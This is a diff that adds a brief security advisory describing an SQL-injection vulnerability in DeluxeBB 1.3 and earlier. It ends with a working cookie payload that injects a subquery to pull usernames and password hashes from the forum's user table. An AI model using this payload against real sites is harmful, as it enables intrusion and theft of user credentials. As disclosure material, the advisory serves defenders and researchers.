@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/39962/info
+
+DeluxeBB is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+DeluxeBB 1.3 and earlier versions are vulnerable. 
+
+The following example data is available:
+
+membercookie=guest
+memberid=xx',(select+concat(username,0x2e,pass)+from+deluxebb_users+limit+1),'none',0,0,0,0,0,'guest','1269081154')+--+x 
